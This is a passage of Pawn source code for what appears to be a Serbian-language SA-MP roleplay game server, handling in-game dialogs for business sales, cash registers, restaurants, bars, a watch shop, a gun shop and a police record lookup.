			strmid( BusinessInfo[ id ][ bOwner ], ImeIgraca( playerid ), 0, strlen( ImeIgraca( playerid ) ), 255);

			new q[ 110 ];
			mysql_format( mSQL, q, sizeof(q), "UPDATE `bussines` SET `b_owner_sqlID` = '%d', `bOwner` = '%s' WHERE `bussines_id` = '%d'",
					BusinessInfo[ id ][ bOwner_sqlID ],
					BusinessInfo[ id ][ bOwner ],
					BusinessInfo[ id ][ b_ID ] );

		   	mysql_tquery( mSQL, q );	

			Bussines_Refresh( id );

			sql_user_update_integer( playerid, "bussines_id", PlayerInfo[ playerid ][ xBussinesSqlID ] );
			sql_user_update_integer( GlobalProdaja[ playerid ], "bussines_id", PlayerInfo[ GlobalProdaja[ playerid ] ][ xBussinesSqlID ] );

			SCMF( GlobalProdaja[ playerid ], 0x33CCFFFF, "(FIRMA): Prodali ste firmu igracu {FFFFFF}%s {33CCFF}za {FFFFFF}(%d).", ImeIgraca( playerid ), GlobalCena[ playerid ] );
			DajIgracuNovac( GlobalProdaja[ playerid ], GlobalCena[ playerid ] );
			DajIgracuNovac( playerid, -GlobalCena[ playerid ] );
			SendClientMessage( playerid, 0x33CCFFFF, "(FIRMA): Kupili ste firmu." );
			GlobalProdaja[ playerid ] = -1;
			GlobalCena[ playerid ] = -1;
			GlobalImovinaIgracu[GlobalProdaja[playerid]] = false;
	    }
	    else if( !response )
		{
			SCMF( GlobalProdaja[ playerid ], 0x33CCFFFF, "(FIRMA): Igrac {FFFFFF}%s {33CCFF}je odbio vasu ponudu za kupovinu firme.", ImeIgraca( playerid ) );
			SendInfoMessage( playerid, "Odbili ste ponudu.");
			GlobalProdaja[ playerid ] = -1;
			GlobalCena[ playerid ] = -1;
	    }
	}
	else if(dialogid == dialog_FLOCK )
	{
        new id = GetNearestBussines( playerid );
        if( id != PlayerInfo[ playerid ][ xFirmaID ]) return SendErrorMessage( playerid, "Niste kod vase firme." );
  		if( response )
 		{
        	GameTextForPlayer( playerid, "Firma ~g~otkljucana!", 3000, 3 );
            BusinessInfo[ id ][ bLocked ] = 0;
        	sql_bussines_update_integer( id, "b_locked", BusinessInfo[ id ][ bLocked ] );
		}
		else
		{
        	GameTextForPlayer( playerid, "Firma ~r~zakljucana!", 3000, 3 );
		    BusinessInfo[ id ][ bLocked ] = 1;
        	sql_bussines_update_integer( id, "b_locked", BusinessInfo[ id ][ bLocked ] );
		}
	}
	else if(dialogid == dialog_FCNAME && response )
	{
	    new IDFirme = PlayerInfo[ playerid ][ xFirmaID ], imefirme[64];
        if( IDFirme == -1 ) return SendErrorMessage( playerid, "Ne posedujes firmu!");
        if( sscanf( inputtext, "s[64]", imefirme ) ) return ShowPlayerDialog( playerid, dialog_FCNAME, DIALOG_STYLE_INPUT, D_NASLOV, "{FFFFFF}* Molimo vas da unesete novo ime koje zelite:", "Potvrdi", "Odustani" );

		strmid( BusinessInfo[ IDFirme ][ bName ], imefirme, 0, strlen( imefirme ), 64);
		sql_bussines_update_string( IDFirme, "b_name", BusinessInfo[ IDFirme ][ bName ] );
		Bussines_Refresh( IDFirme );
		SendInfoMessage( playerid, "Uspesno si promenio ime firme." );
	}
	else if(dialogid == dialog_FOMONEY )
	{
		if( !response ) return 1;
		if( response )
		{
			new iznos, IDFirme = PlayerInfo[ playerid ][ xFirmaID ];
			if( sscanf(inputtext, "i", iznos)) return SendErrorMessage( playerid, "Niste uneli kolicinu novca za ostavljanje!");
			if( iznos < 1 || iznos > 10000000) return SendErrorMessage( playerid, "Kolicina novca ne moze biti ispod 1 i iznad 10.000.000!");
            if( iznos > PlayerInfo[ playerid  ][ xNovac ] ) return SendErrorMessage( playerid, "Nemate toliko novca kod sebe!");

			DajIgracuNovac( playerid, -iznos );
			BusinessInfo[ IDFirme ][ bMoney ] += iznos;
			SendInfoMessage( playerid, "Ostavili ste {FFFFFF}($%d) {4282C0}u kasu firme.", iznos );
		    sql_bussines_update_integer( IDFirme, "b_money", BusinessInfo[ IDFirme ][ bMoney ] );
		}
	}
	else if(dialogid == dialog_FPMONEY )
	{
		if( !response ) return 1;
		if( response )
		{
			new iznos, IDFirme = PlayerInfo[ playerid ][ xFirmaID ];
			if( sscanf(inputtext, "i", iznos)) return SendErrorMessage( playerid, "Niste uneli kolicinu novca za ostavljanje!");
			if( iznos < 1 || iznos > 10000000) return SendErrorMessage( playerid, "Kolicina novca ne moze biti ispod 1 i iznad 10.000.000!");
            if( iznos > BusinessInfo[ IDFirme ][ bMoney ] ) return SendErrorMessage( playerid, "Nemate toliko novca u kasi!");

			DajIgracuNovac( playerid, iznos );
			BusinessInfo[ IDFirme ][ bMoney ] -= iznos;
			SendInfoMessage( playerid, "Podigli ste {FFFFFF}($%d) {4282C0}iz kase firme.", iznos );
		    sql_bussines_update_integer( IDFirme, "b_money", BusinessInfo[ IDFirme ][ bMoney ] );
		}
	}
	else if(dialogid == dialog_RESTORAN )
	{
		if( !response ) return 1;
		switch( listitem )
		{
			case 0:
			{
				if( PlayerInfo[ playerid ][ xNovac ] < 150) return SendErrorMessage( playerid, "Nemate dovoljno novca 150$!");
				BussinesMoney( uFirmi[ playerid ] , 150, true );
				DajIgracuNovac( playerid, -150 );
				DodajIgracuHP(playerid, 13);

				SendNearbyMessage(playerid, 15.0, 0xC2A2DAFF, "* %s jede juhu.", ImeIgraca( playerid ) );
			    OnePlayAnim( playerid, "FOOD", "EAT_Burger", 3.0, 0, 0, 0, 0, 0);
			}
			case 1:
			{
				if( PlayerInfo[ playerid ][ xNovac ] < 220) return SendErrorMessage( playerid, "Nemate dovoljno novca 220$!");
				BussinesMoney( uFirmi[ playerid ] , 220, true );
				DajIgracuNovac( playerid, -220 );
				DodajIgracuHP(playerid, 18);

				SendNearbyMessage(playerid, 15.0, 0xC2A2DAFF, "* %s jede piletinu.", ImeIgraca( playerid ) );
			    OnePlayAnim( playerid, "FOOD", "EAT_Burger", 3.0, 0, 0, 0, 0, 0);
			}
			case 2:
			{
				if( PlayerInfo[ playerid ][ xNovac ] < 350) return SendErrorMessage( playerid, "Nemate dovoljno novca 350$!");
				BussinesMoney( uFirmi[ playerid ] , 350, true );
				DajIgracuNovac( playerid, -350 );
				DodajIgracuHP(playerid, 20);

				SendNearbyMessage(playerid, 15.0, 0xC2A2DAFF, "* %s jede pecenog morskog psa na salati.", ImeIgraca( playerid ) );
			    OnePlayAnim( playerid, "FOOD", "EAT_Burger", 3.0, 0, 0, 0, 0, 0);
			}
		    case 3:
			{
				if( PlayerInfo[ playerid ][ xNovac ] < 410) return SendErrorMessage( playerid, "Nemate dovoljno novca 410$!");
				BussinesMoney( uFirmi[ playerid ] , 410, true );
				DajIgracuNovac( playerid, -410);
				DodajIgracuHP(playerid, 25);

				SendNearbyMessage(playerid, 15.0, 0xC2A2DAFF, "* %s jede spagete.", ImeIgraca( playerid ) );
			    OnePlayAnim( playerid, "FOOD", "EAT_Burger", 3.0, 0, 0, 0, 0, 0);
			}
		    case 4:
			{
				if( PlayerInfo[ playerid ][ xNovac ] < 630) return SendErrorMessage( playerid, "Nemate dovoljno novca 630$!");
				BussinesMoney( uFirmi[ playerid ] , 630, true );
				DajIgracuNovac( playerid, -630 );
				DodajIgracuHP(playerid, 30);

				SendNearbyMessage(playerid, 15.0, 0xC2A2DAFF, "* %s jede kolac.", ImeIgraca( playerid ) );
			    OnePlayAnim( playerid, "FOOD", "EAT_Burger", 3.0, 0, 0, 0, 0, 0);
			}
		    case 5:
			{
				if( PlayerInfo[ playerid ][ xNovac ] < 50) return SendErrorMessage( playerid, "Nemate dovoljno novca 50$!");
				BussinesMoney( uFirmi[ playerid ] , 50, true );
				DajIgracuNovac( playerid, -50 );
				DodajIgracuHP(playerid, 10);

				SendNearbyMessage(playerid, 15.0, 0xC2A2DAFF, "* %s pije coca colu.", ImeIgraca( playerid ) );
			    SetPlayerSpecialAction( playerid, SPECIAL_ACTION_DRINK_SPRUNK);
			}
			case 6:
			{
				if( PlayerInfo[ playerid ][ xNovac ] < 25) return SendErrorMessage( playerid, "Nemate dovoljno novca 25$!");
				BussinesMoney( uFirmi[ playerid ] , 25, true );
				DajIgracuNovac( playerid, -25 );
				DodajIgracuHP(playerid, 5);

				SendNearbyMessage(playerid, 15.0, 0xC2A2DAFF, "* %s pije vodu.", ImeIgraca( playerid ) );
			    SetPlayerSpecialAction( playerid, SPECIAL_ACTION_DRINK_SPRUNK);
			}
		}
	}
	else if(dialogid == dialog_BUYWATCH && response)
	{
	    switch(listitem)
	    {
	        case 0:
	        {
	            if( PlayerInfo[ playerid ][ xNovac ] < 521 ) return SendErrorMessage( playerid, "Nemate dovoljno novca." );
				DajIgracuNovac( playerid, -521 );
				SendInfoMessage( playerid, "Uspesno si kupio sat marke Rolex Datejust za $521. [ /time ]" );
				PlayerInfo[ playerid ][ xSat ] = 19039;
				sql_user_update_integer( playerid, "watch", PlayerInfo[ playerid ][ xSat ] );
	        }
	        case 1:
	        {
	            if( PlayerInfo[ playerid ][ xNovac ] < 618 ) return SendErrorMessage( playerid, "Nemate dovoljno novca." );
				DajIgracuNovac( playerid, -618 );
				SendInfoMessage( playerid, "Uspesno si kupio sat marke Emporio Armani za $618. [ /time ]" );
				PlayerInfo[ playerid ][ xSat ] = 19040;
				sql_user_update_integer( playerid, "watch", PlayerInfo[ playerid ][ xSat ] );
	        }
	        case 2:
	        {
	            if( PlayerInfo[ playerid ][ xNovac ] < 723 ) return SendErrorMessage( playerid, "Nemate dovoljno novca." );
				DajIgracuNovac( playerid, -723 );
				SendInfoMessage( playerid, "Uspesno si kupio sat marke Casio G-Shock za $723. [ /time ]" );
				PlayerInfo[ playerid ][ xSat ] = 19041;
				sql_user_update_integer( playerid, "watch", PlayerInfo[ playerid ][ xSat ] );
	        }
	        case 3:
	        {
	            if( PlayerInfo[ playerid ][ xNovac ] < 819 ) return SendErrorMessage( playerid, "Nemate dovoljno novca." );
				DajIgracuNovac( playerid, -819 );
				SendInfoMessage( playerid, "Uspesno si kupio sat marke Michael Kors za $819. [ /time ]" );
				PlayerInfo[ playerid ][ xSat ] = 19042;
				sql_user_update_integer( playerid, "watch", PlayerInfo[ playerid ][ xSat ] );
	        }
	        case 4:
	        {
	            if( PlayerInfo[ playerid ][ xNovac ] < 916 ) return SendErrorMessage( playerid, "Nemate dovoljno novca." );
				DajIgracuNovac( playerid, -916 );
				SendInfoMessage( playerid, "Uspesno si kupio sat marke Hugo Boss za $916. [ /time ]" );
				PlayerInfo[ playerid ][ xSat ] = 19043;
				sql_user_update_integer( playerid, "watch", PlayerInfo[ playerid ][ xSat ] );
	        }
	    }
	}
	else if(dialogid == dialog_CLUCKIN)
	{
		if( !response ) return 1;
		switch( listitem )
		{
			case 0:
			{
				if( PlayerInfo[ playerid ][ xNovac ] < 100) return SendErrorMessage( playerid, "Nemate dovoljno novca 100$!");
				BussinesMoney( uFirmi[ playerid ], 100, true );
				DajIgracuNovac( playerid, -100 );
				DodajIgracuHP(playerid, 12);

				SendNearbyMessage(playerid, 15.0, 0xC2A2DAFF, "* %s jede topli sendvic.", ImeIgraca( playerid ) );
			    OnePlayAnim( playerid, "FOOD", "EAT_Burger", 3.0, 0, 0, 0, 0, 0);
			}
			case 1:
			{
				if( PlayerInfo[ playerid ][ xNovac ] < 150) return SendErrorMessage( playerid, "Nemate dovoljno novca 150$!");
				BussinesMoney( uFirmi[ playerid ], 150, true );
				DajIgracuNovac( playerid, -150 );
				DodajIgracuHP(playerid, 13);

				SendNearbyMessage(playerid, 15.0, 0xC2A2DAFF, "* %s jede cevape.", ImeIgraca( playerid ) );
			    OnePlayAnim( playerid, "FOOD", "EAT_Burger", 3.0, 0, 0, 0, 0, 0);
			}
			case 2:
			{
				if( PlayerInfo[ playerid ][ xNovac ] < 100) return SendErrorMessage( playerid, "Nemate dovoljno novca 100$!");
				BussinesMoney( uFirmi[ playerid ], 100, true );
				DajIgracuNovac( playerid, -100 );
				DodajIgracuHP(playerid, 12);

				SendNearbyMessage(playerid, 15.0, 0xC2A2DAFF, "* %s jede filete.", ImeIgraca( playerid ) );
			    OnePlayAnim( playerid, "FOOD", "EAT_Burger", 3.0, 0, 0, 0, 0, 0);
			}
			case 3:
			{
				if( PlayerInfo[ playerid ][ xNovac ] < 100) return SendErrorMessage( playerid, "Nemate dovoljno novca 100$!");
				BussinesMoney( uFirmi[ playerid ], 100, true );
				DajIgracuNovac( playerid, -100 );
				DodajIgracuHP(playerid, 12);

				SendNearbyMessage(playerid, 15.0, 0xC2A2DAFF, "* %s jede vocnu salatu.", ImeIgraca( playerid ) );
			    OnePlayAnim( playerid, "FOOD", "EAT_Burger", 3.0, 0, 0, 0, 0, 0);
			}
		    case 4:
			{
				if( PlayerInfo[ playerid ][ xNovac ] < 120) return SendErrorMessage( playerid, "Nemate dovoljno novca 120$!");
				BussinesMoney( uFirmi[ playerid ], 120, true );
				DajIgracuNovac( playerid, -120 );
				DodajIgracuHP(playerid, 13);

				SendNearbyMessage(playerid, 15.0, 0xC2A2DAFF, "* %s jede kebab.", ImeIgraca( playerid ) );
			    OnePlayAnim( playerid, "FOOD", "EAT_Burger", 3.0, 0, 0, 0, 0, 0);
			}
			case 5:
			{
				if( PlayerInfo[ playerid ][ xNovac ] < 50) return SendErrorMessage( playerid, "Nemate dovoljno novca 50$!");
				BussinesMoney( uFirmi[ playerid ], 50, true );
				DajIgracuNovac( playerid, -50 );
				DodajIgracuHP(playerid, 10);

				SendNearbyMessage(playerid, 15.0, 0xC2A2DAFF, "* %s pije sprite.", ImeIgraca( playerid ) );
			    SetPlayerSpecialAction( playerid, SPECIAL_ACTION_DRINK_SPRUNK);
			}
			case 6:
			{
				if( PlayerInfo[ playerid ][ xNovac ] < 25 ) return SendErrorMessage( playerid, "Nemate dovoljno novca 25$!");
				BussinesMoney( uFirmi[ playerid ], 25, true );
				DajIgracuNovac( playerid, -25 );
				DodajIgracuHP(playerid, 5);

				SendNearbyMessage(playerid, 15.0, 0xC2A2DAFF, "* %s pije vodu.", ImeIgraca( playerid ) );
			    SetPlayerSpecialAction( playerid, SPECIAL_ACTION_DRINK_SPRUNK);
			}
		}
	}
	else if(dialogid == dialog_PIZZA )
	{
		if( !response ) return 1;
		switch( listitem )
		{
			case 0:
			{
				if( PlayerInfo[ playerid ][ xNovac ] < 100) return SendErrorMessage( playerid, "Nemate dovoljno novca 100$!");
				BussinesMoney( uFirmi[ playerid ] , 100, true);
				DajIgracuNovac( playerid, -100 );
				DodajIgracuHP(playerid, 12);

				SendNearbyMessage(playerid, 15.0, 0xC2A2DAFF, "* %s jede pizzetu.", ImeIgraca( playerid ) );
			    OnePlayAnim( playerid, "FOOD", "EAT_Burger", 3.0, 0, 0, 0, 0, 0);
			}
			case 1:
			{
				if( PlayerInfo[ playerid ][ xNovac ] < 150) return SendErrorMessage( playerid, "Nemate dovoljno novca 150$!");
				BussinesMoney( uFirmi[ playerid ] , 150, true);
				DajIgracuNovac( playerid, -150 );
				DodajIgracuHP(playerid, 13);

				SendNearbyMessage(playerid, 15.0, 0xC2A2DAFF, "* %s jede veliku pizzu.", ImeIgraca( playerid ) );
			    OnePlayAnim( playerid, "FOOD", "EAT_Burger", 3.0, 0, 0, 0, 0, 0);
			}
			case 2:
			{
				if( PlayerInfo[ playerid ][ xNovac ] < 45) return SendErrorMessage( playerid, "Nemate dovoljno novca 45$!");
				BussinesMoney( uFirmi[ playerid ] , 45, true);
				DajIgracuNovac( playerid, -45 );
				DodajIgracuHP(playerid, 10);

				SendNearbyMessage(playerid, 15.0, 0xC2A2DAFF, "* %s jede topli sendvic.", ImeIgraca( playerid ) );
			    OnePlayAnim( playerid, "FOOD", "EAT_Burger", 3.0, 0, 0, 0, 0, 0);
			}
			case 3:
			{
				if( PlayerInfo[ playerid ][ xNovac ] < 40) return SendErrorMessage( playerid, "Nemate dovoljno novca 40$!");
				BussinesMoney( uFirmi[ playerid ] , 40, true);
				DajIgracuNovac( playerid, -40 );
				DodajIgracuHP(playerid, 10);

				SendNearbyMessage(playerid, 15.0, 0xC2A2DAFF, "* %s jede salatu.", ImeIgraca( playerid ) );
			    OnePlayAnim( playerid, "FOOD", "EAT_Burger", 3.0, 0, 0, 0, 0, 0);
			}
		   	case 4:
			{
				if( PlayerInfo[ playerid ][ xNovac ] < 250) return SendErrorMessage( playerid, "Nemate dovoljno novca 250$!");
				BussinesMoney( uFirmi[ playerid ] , 250, true);
				DajIgracuNovac( playerid, -250 );
				DodajIgracuHP(playerid, 15);

				SendNearbyMessage(playerid, 15.0, 0xC2A2DAFF, "* %s jede jumbo pizzu.", ImeIgraca( playerid ) );
			    OnePlayAnim( playerid, "FOOD", "EAT_Burger", 3.0, 0, 0, 0, 0, 0);
			}
		    case 5:
			{
				if( PlayerInfo[ playerid ][ xNovac ] < 50) return SendErrorMessage( playerid, "Nemate dovoljno novca 50$!");
				BussinesMoney( uFirmi[ playerid ] , 50, true);
				DajIgracuNovac( playerid, -50 );
				DodajIgracuHP(playerid, 12);

				SendNearbyMessage(playerid, 15.0, 0xC2A2DAFF, "* %s pije sprite.", ImeIgraca( playerid ) );
			    SetPlayerSpecialAction( playerid, SPECIAL_ACTION_DRINK_SPRUNK);
			}
			case 6:
			{
				if( PlayerInfo[ playerid ][ xNovac ] < 25) return SendErrorMessage( playerid, "Nemate dovoljno novca 25$!");
				BussinesMoney( uFirmi[ playerid ] , 25, true);
				DajIgracuNovac( playerid, -25 );
				DodajIgracuHP(playerid, 10);

				SendNearbyMessage(playerid, 15.0, 0xC2A2DAFF, "* %s pije vodu.", ImeIgraca( playerid ) );
			    SetPlayerSpecialAction( playerid, SPECIAL_ACTION_DRINK_SPRUNK);
			}
		}
	}
	else if(dialogid == dialog_BURG)
	{
		if( !response ) return 1;

		switch( listitem )
		{
			case 0:
			{
				if( PlayerInfo[ playerid ][ xNovac ] < 200) return SendErrorMessage( playerid, "Nemate dovoljno novca 200$!");
				BussinesMoney( uFirmi[ playerid ], 200, true);
				DajIgracuNovac( playerid, -200 );
				DodajIgracuHP(playerid, 17);

				SendNearbyMessage(playerid, 15.0, 0xC2A2DAFF, "* %s jede Moo Kids Meal.", ImeIgraca( playerid ) );
			    OnePlayAnim( playerid, "FOOD", "EAT_Burger", 3.0, 0, 0, 0, 0, 0);
			}
			case 1:
			{
				if( PlayerInfo[ playerid ][ xNovac ] < 250) return SendErrorMessage( playerid, "Nemate dovoljno novca 250$!");
				BussinesMoney( uFirmi[ playerid ], 250, true);
				DajIgracuNovac( playerid, -250 );
				DodajIgracuHP(playerid, 20);

				SendNearbyMessage(playerid, 15.0, 0xC2A2DAFF, "* %s jede Beef Tower.", ImeIgraca( playerid ) );
			    OnePlayAnim( playerid, "FOOD", "EAT_Burger", 3.0, 0, 0, 0, 0, 0);
			}
			case 2:
			{
				if( PlayerInfo[ playerid ][ xNovac ] < 250) return SendErrorMessage( playerid, "Nemate dovoljno novca 250$!");
				BussinesMoney( uFirmi[ playerid ], 250, true);
				DajIgracuNovac( playerid, -250 );
				DodajIgracuHP(playerid, 20);

				SendNearbyMessage(playerid, 15.0, 0xC2A2DAFF, "* %s jede Salad Meal.", ImeIgraca( playerid ) );
			    OnePlayAnim( playerid, "FOOD", "EAT_Burger", 3.0, 0, 0, 0, 0, 0);
			}
			case 3:
			{
				if( PlayerInfo[ playerid ][ xNovac ] < 400) return SendErrorMessage( playerid, "Nemate dovoljno novca 400$!");
				BussinesMoney( uFirmi[ playerid ], 400, true);
				DajIgracuNovac( playerid, -400 );
				DodajIgracuHP(playerid, 30);

				SendNearbyMessage(playerid, 15.0, 0xC2A2DAFF, "* %s Meat Stack.", ImeIgraca( playerid ) );
			    OnePlayAnim( playerid, "FOOD", "EAT_Burger", 3.0, 0, 0, 0, 0, 0);
			}
		}
	}
	else if(dialogid == dialog_DRINK )
	{
	    new drunklevel = GetPlayerDrunkLevel( playerid );
		if( !response ) return 1;
		switch( listitem )
		{
			case 0:
			{
				if( PlayerInfo[ playerid ][ xNovac ] < 200) return SendErrorMessage( playerid, "Nemate dovoljno novca 200$!");

				if( uFirmi[ playerid ] != -1 ) BussinesMoney( uFirmi[ playerid ] , 200, true );

				DajIgracuNovac( playerid, -200 );

				SetPlayerDrunkLevel( playerid, drunklevel + 1000);
				if( drunklevel > 2000 )
				{
					GameTextForPlayer( playerid, "~p~Pijani ste", 3500, 1);
				}

				SendNearbyMessage(playerid, 15.0, 0xC2A2DAFF, "* %s pije viski.", ImeIgraca( playerid ) );
			    SetPlayerSpecialAction( playerid, SPECIAL_ACTION_DRINK_BEER);
			}
			case 1:
			{
				if( PlayerInfo[ playerid ][ xNovac ] < 170) return SendErrorMessage( playerid, "Nemate dovoljno novca 170$!");
				if( uFirmi[ playerid ] != -1 ) BussinesMoney( uFirmi[ playerid ], 170, true);

				DajIgracuNovac( playerid, -170 );

				SetPlayerDrunkLevel( playerid, drunklevel + 500);
				if( drunklevel > 2000 )
				{
					GameTextForPlayer( playerid, "~p~Pijani ste", 3500, 1);
				}

				SendNearbyMessage(playerid, 15.0, 0xC2A2DAFF, "* %s pije vodku.", ImeIgraca( playerid ) );
			    SetPlayerSpecialAction( playerid, SPECIAL_ACTION_DRINK_WINE);
			}
			case 2:
			{
				if( PlayerInfo[ playerid ][ xNovac ] < 85) return SendErrorMessage( playerid, "Nemate dovoljno novca 85$!");
				if( uFirmi[ playerid ] != -1 ) BussinesMoney( uFirmi[ playerid ], 85, true );

				DajIgracuNovac( playerid, -85 );

				SetPlayerDrunkLevel( playerid, drunklevel + 200);
				if( drunklevel > 2000 )
				{
					GameTextForPlayer( playerid, "~p~Pijani ste", 3500, 1);
				}

				SendNearbyMessage(playerid, 15.0, 0xC2A2DAFF, "* %s pije Heineken pivo.", ImeIgraca( playerid ) );
			    SetPlayerSpecialAction( playerid, SPECIAL_ACTION_DRINK_WINE);
			}
			case 3:
			{
				if( PlayerInfo[ playerid ][ xNovac ] < 120) return SendErrorMessage( playerid, "Nemate dovoljno novca 120$!");
				if( uFirmi[ playerid ] != -1 ) BussinesMoney( uFirmi[ playerid ], 120, true );

				DajIgracuNovac( playerid, -120 );

				SetPlayerDrunkLevel( playerid, drunklevel + 800);
				if( drunklevel > 2000 )
				{
					GameTextForPlayer( playerid, "~p~Pijani ste", 3500, 1);
				}

				SendNearbyMessage(playerid, 15.0, 0xC2A2DAFF, "* %s pije Konjak.", ImeIgraca( playerid ) );
			    SetPlayerSpecialAction( playerid, SPECIAL_ACTION_DRINK_WINE);
			}
			case 4:
			{
				if( PlayerInfo[ playerid ][ xNovac ] < 150) return SendErrorMessage( playerid, "Nemate dovoljno novca 150$!");
				if( uFirmi[ playerid ] != -1 ) BussinesMoney( uFirmi[ playerid ], 150, true );

				DajIgracuNovac( playerid, -150 );

				SetPlayerDrunkLevel( playerid, drunklevel + 500);
				if( drunklevel > 2000 )
				{
					GameTextForPlayer( playerid, "~p~Pijani ste", 3500, 1);
				}

				SendNearbyMessage(playerid, 15.0, 0xC2A2DAFF, "* %s pije tekilu.", ImeIgraca( playerid ) );
			    SetPlayerSpecialAction( playerid, SPECIAL_ACTION_DRINK_WINE);
			}
			case 5:
			{
				if( PlayerInfo[ playerid ][ xNovac ] < 290) return SendErrorMessage( playerid, "Nemate dovoljno novca 290$!");
				if( uFirmi[ playerid ] != -1 ) BussinesMoney( uFirmi[ playerid ], 290, true );

				DajIgracuNovac( playerid, -290 );

				SetPlayerDrunkLevel( playerid, drunklevel + 700);
				if( drunklevel > 2000 )
				{
					GameTextForPlayer( playerid, "~p~Pijani ste", 3500, 1);
				}

				SendNearbyMessage(playerid, 15.0, 0xC2A2DAFF, "* %s pije Jack Daniels.", ImeIgraca( playerid ) );
			    SetPlayerSpecialAction( playerid, SPECIAL_ACTION_DRINK_WINE);
			}
			case 6:
			{
				if( PlayerInfo[ playerid ][ xNovac ] < 60 )  return SendErrorMessage( playerid, "Nemate dovoljno novca 60$!");
				if( uFirmi[ playerid ] != -1 ) BussinesMoney( uFirmi[ playerid ], 60, true );

				DajIgracuNovac( playerid, -60 );

				SendNearbyMessage(playerid, 15.0, 0xC2A2DAFF, "* %s pije mineralnu vodu.", ImeIgraca( playerid ) );
			    SetPlayerSpecialAction( playerid, SPECIAL_ACTION_DRINK_WINE);
			}
			case 7:
			{
				if( PlayerInfo[ playerid ][ xNovac ] < 80 ) return SendErrorMessage( playerid, "Nemate dovoljno novca 80$!");
				if( uFirmi[ playerid ] != -1 ) BussinesMoney( uFirmi[ playerid ], 80, true );

				DajIgracuNovac( playerid, -80 );

				SendNearbyMessage(playerid, 15.0, 0xC2A2DAFF, "* %s pije cedevitu od narandze.", ImeIgraca( playerid ) );
			    SetPlayerSpecialAction( playerid, SPECIAL_ACTION_DRINK_WINE);
			}
			case 8:
			{
				if( PlayerInfo[ playerid ][ xNovac ] < 50 ) return SendErrorMessage( playerid, "Nemate dovoljno novca 50$!");
				if( uFirmi[ playerid ] != -1 ) BussinesMoney( uFirmi[ playerid ], 50, true );

				DajIgracuNovac( playerid, -50 );

				SendNearbyMessage(playerid, 15.0, 0xC2A2DAFF, "* %s pije coca colu.", ImeIgraca( playerid ) );
			    SetPlayerSpecialAction( playerid, SPECIAL_ACTION_DRINK_WINE);
			}
		}
	}
	else if(dialogid == dialog_GUNSHOP )
	{
        if( response )
		{
            switch( listitem )
			{
				case 0:
				{
					if( PlayerInfo[ playerid ][ xNovac ] < 1500 ) return SendErrorMessage( playerid, "Nemate dovoljno novca 1.500$");

					DajIgracuNovac( playerid, -1500 );
					GiveWeaponToPlayer( playerid, 4, 1);
					BussinesMoney( uFirmi[ playerid ], 1500, true);

					SendNearbyMessage(playerid, 15.0, 0xC2A2DAFF, "* %s je kupio noz.", ImeIgraca( playerid ) );
        		}
        		case 1:
				{
					if( PlayerInfo[ playerid ][ xNovac ] < 500) return SendErrorMessage( playerid, "Nemate dovoljno novca 500$");

					DajIgracuNovac( playerid, -500 );
					GiveWeaponToPlayer( playerid, 5, 1 );
					BussinesMoney( uFirmi[ playerid ], 500, true);

					SendNearbyMessage(playerid, 15.0, 0xC2A2DAFF, "* %s je kupio bassebal bat.", ImeIgraca( playerid ));
        		}
                case 2:
				{
					if( PlayerInfo[ playerid ][ xNovac ] < 2500) return SendErrorMessage( playerid, "Nemate dovoljno novca 2.500$");

					DajIgracuNovac( playerid, -2500 );
					GiveWeaponToPlayer( playerid, 22, 100 );
					BussinesMoney( uFirmi[ playerid ], 2500, true);

					SendNearbyMessage(playerid, 15.0, 0xC2A2DAFF, "* %s je kupio Pistol 9mm.", ImeIgraca( playerid ));
        		}
        		case 3:
				{
					if( PlayerInfo[ playerid ][ xNovac ] < 8000 ) return SendErrorMessage( playerid, "Nemate dovoljno novca 8.000$");

					DajIgracuNovac( playerid, -8000 );
					GiveWeaponToPlayer( playerid, 24, 100 );
					BussinesMoney( uFirmi[ playerid ], 8000, true );

					SendNearbyMessage(playerid, 15.0, 0xC2A2DAFF, "* %s je kupio Desert Eagle.", ImeIgraca( playerid ) );
        		}
        		case 4:
				{
					if( PlayerInfo[ playerid ][ xNovac ] < 8000) return SendErrorMessage( playerid, "Nemate dovoljno novca 8.000$");

					DajIgracuNovac( playerid, -8000 );
					GiveWeaponToPlayer( playerid, 25, 50 );
					BussinesMoney( uFirmi[ playerid ], 8000, true );

					SendNearbyMessage(playerid, 15.0, 0xC2A2DAFF, "* %s je kupio Shotgun.", ImeIgraca( playerid ));
        		}
        		case 5:
				{
					if( PlayerInfo[ playerid ][ xNovac ] < 12000) return SendErrorMessage( playerid, "Nemate dovoljno novca 12.000$");

					DajIgracuNovac( playerid, -12000 );
					GiveWeaponToPlayer( playerid, 33, 50 );
					BussinesMoney( uFirmi[ playerid ], 12000, true );

					SendNearbyMessage(playerid, 15.0, 0xC2A2DAFF, "* %s je kupio Country Rifle.", ImeIgraca( playerid ));
        		}
        		case 6:
				{
					if( PlayerInfo[ playerid ][ xNovac ] < 10000) return SendErrorMessage( playerid, "Nemate dovoljno novca 10.000$");

					DajIgracuNovac( playerid, -10000 );
					SetPlayerArmour( playerid, 100 );
					BussinesMoney( uFirmi[ playerid ], 10000, true );

					SendNearbyMessage(playerid, 15.0, 0xC2A2DAFF, "* %s je kupio pancir.", ImeIgraca( playerid ));
        		}
			}
		}
	}
    else if(dialogid == dialog_SEARCH_NAME && response && strlen( inputtext ) )
	{
		if( GetPlayerIdFromName( inputtext ) == IPI ) return SendClientMessage( playerid, CRVENA, "(POLICIJA): Pogresno ime gradjanina.");
		
		new ID = GetPlayerIdFromName( inputtext );
        strdel( DialogStrgEx, 0, sizeof( DialogStrgEx ) );
		format( DialogStrgEx, sizeof( DialogStrgEx ),
													"{FFFFFF}Ime i prezime: %s\nPol: %s\nGodine: %d\nPosao: %s\nBroj mobilnog: %d\n\nZlocin: %s\nPrijavio: %s",
														ImeIgraca( ID ), ((PlayerInfo[ID][xPol] == 1) ? ("Musko") : ("Zensko")), PlayerInfo[ ID ][ xGodine ], 
														getJobName( PlayerInfo[ ID ][ xPosao ] ), PlayerInfo[ ID ][ xBrojTelefona ], ZlocinInfo[ ID ][ zZlocin ], 
														ZlocinInfo[ ID ][ zPrijavio ] );

		ShowPlayerDialog( playerid, 0, DIALOG_STYLE_MSGBOX, D_NASLOV, DialogStrgEx, "U redu", "" );
		strdel( DialogStrgEx, 0, sizeof( DialogStrgEx ));
		return 1;
	}
	else if(dialogid == dialog_SEARCH_NUMBERPLATE && response && strlen( inputtext ) )
	{
		new vehicleid = strval( inputtext );

    	if( vehicleid != IVI ) return SendErrorMessage( playerid, "Krivi unos." );
        strdel( DialogStrgEx, 0, sizeof( DialogStrgEx ) );
